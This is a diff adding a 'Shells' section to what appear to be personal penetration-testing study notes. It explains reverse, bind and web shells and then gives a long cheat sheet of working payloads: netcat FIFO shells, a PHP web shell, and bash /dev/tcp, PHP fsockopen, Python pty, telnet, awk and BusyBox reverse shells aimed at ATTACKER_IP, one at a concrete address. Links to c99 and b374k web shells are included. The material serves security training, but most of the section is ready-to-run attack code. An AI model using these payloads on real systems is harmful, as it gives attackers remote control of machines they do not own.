@@ -1576,3 +1576,181 @@ Some commonly used flags include:
 |  | --exclude-length | filters responses by size |
 
 E.g. gobuster vhost -u "http://10.10.31.174" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320 
+
+## Shells
+<i>Shells</i> allow users to interact with an OS, usually through a CLI. Attackers use these shells on compromised systems to do execute several activities, which include:
++ Remote system control
++ Privilege escalation
++ Data exfiltration
++ Persistence and maintenance access
++ Post-exploitation
++ Access other systems on the network (i.e. pivoting)
+
+### Reverse Shell
+Reverse shells or "connect back shells" initiate a connection from the target system to the attacker's machine, which aids in avoiding detection from network firewalls and other security measures.
+
+The process typically is as follows:
+
+1 - Set up a listener using Netcat 
+
+E.g. nc listener
+```
+nc -lvnp 443
+```
+Any port can be used to wait for a connection. Note: known ports (e.g. 53, 80, 8080, 443, 139, 445) tend to be used to blend with legitimate traffic
+
+2- Gaining reverse shell access
+
+Once a listener is set, a rever shell payload is executed. This abuses the vulnerability/unauthorised access granted and executes a command that will expose the shell through the network. [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) have some examples.
+
+E.g. Pipe rever shell
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] [ATTACKER_PORT] >/tmp/f
+```
+
+3- Attacker receives shell
+
+Once received, the attacker can execute commands as if they were logging into a regular terminal
+
+### Bind Shell
+Bind shells will bind a port on the compromised system and listen for incoming connections. When a connection is made, it exposes a shell session. This method can be used when the compromised target does not allow outgoing connections. Note: this tends to be less popular since it needs to remain active, which increases the chances of detection.
+
+The process typically is as follows:
+
+1- Setting up the bind shell on the target
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+Once the command is executed, it will wait for an incoming connection.
+
+2- Attacker connects to the bind shell
+
+As the target waits for incoming ocnnections, attackers can use Netcat to connect.
+```
+nc -nv [TARGET_IP] 8080
+```
+
+After connection, a shell is obtained and commands can be executed.
+
+### Web Shells
+Web shells are scripts written in a language supported by a compromised web server, which can execute commands through the web server itself. These are usually files containing the code that executes that can be hidden in a compromised web app or service. These can be written in PHP, ASP, JSP, and CGI scripts.
+
+1- Upload web shell file to web server
+
+E.g. simple PHP web shell
+```
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+The above shell can be saved in to a file (e.g. shell.php) and then uploaded into the web server that is vulnerable to unrestricted file upload, file inclusion, command injections, etc.
+
+2- Access the shell through URL
+
+Once deployed, the file can be accessed through the URL where the web shell is hoted (e.g. http://victim.com/uploads/shell.php). 
+
+3- Execute commands
+
+For the above example, GET methods and the value of cmd need to be provided (e.g. http://victim.com/uploads/shell.php?cmd=whoami).
+
+Note: there are many popular web shells that can be found online, including:
++ [p0wny-shell](https://github.com/flozz/p0wny-shell)
++ [b374k shell](https://github.com/b374k/b374k)
++ [c99 shell](https://www.r57shell.net/single.php?id=13)
+
+Other can be found on [r57shell.net](https://www.r57shell.net/index.php).
+
+### Other Shell Listeners
+Other tools that can be used as listeners include:
+
+<i>Rlwrap</i> - provides editing keyboard and history; wrapping **nc** with **rlwrap** allows the use of arrow keys and history for better interaction
+
+```
+rlwrap nc -lvnp 443
+```
+
+<i>Ncat</i> - improved version of Netcat; provides extra features such as encryption (i.e. SSL)
+
+```
+ncat --ssl -lvnp 4444
+```
+
+<i>Socat</i> - allows creation of socket connections between two data sources (e.g. two hosts)
+
+```
+socat -d -d TCP-LISTEN:443 STDOUT
+```
+
+### Shell Payloads
+Shell payloads can be commands or scripts that exposes the shell into incoming connections (i.e. bind shell) or send a connection (i.e. reverse shell).
+
+#### Bash
+E.g. Normal bash reverse shell
+```
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+E.g. Bash read line reverse shell
+```
+exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+E.g. Bash with file descripter 196 reverse shell
+```
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+```
+E.g. Bash with file descripter 5 reverse shell
+```
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+
+#### PHP
+E.g. PHP reverse shell using the exec function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+```
+E.g. PHP reverse shell using the shell_exec function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+```
+E.g. PHP reverse shell using the system function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+```
+E.g. PHP reverse shell using the passthru function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+```
+E.g. PHP reverse shell using the popen function
+```
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+```
+
+#### Python
+E.g. Python reverse shell by exporting environmental variables
+```
+export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+E.g. Python reverse shell using the subprocess module
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+```
+E.g. Short Python reverse shell
+```
+python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+
+#### Others
+E.g. Telnet
+```
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
+```
+E.g. AWK
+```
+awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+E.g. BusyBox
+```
+busybox nc ATTACKER_IP 443 -e sh
+```
